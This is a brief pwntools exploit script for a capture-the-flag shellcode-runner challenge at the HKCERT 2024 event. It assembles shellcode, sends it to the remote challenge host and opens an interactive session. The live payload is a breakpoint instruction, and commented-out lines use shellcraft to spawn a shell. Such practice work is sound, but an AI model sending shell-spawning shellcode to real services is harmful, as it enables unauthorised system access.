from pwn import *

# exe = ELF('./src/chall')
# context.binary = exe.path

# io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("c49-shellcode-runner3.hkcert24.pwnable.hk", 1337, ssl=True)


code = """
int 3
"""
# code = 'mov ebx, 3; mov eax, SYS_exit; int 0x80;'
# code = shellcraft.sh()
# code = code.replace("syscall", "int 0x80")
# code = shellcraft.i386.linux.sh()
shellcode = asm(code)
print(code)
print(shellcode.hex())

# p = run_assembly(code)
# p.interactive()


io.sendline(shellcode)
io.interactive()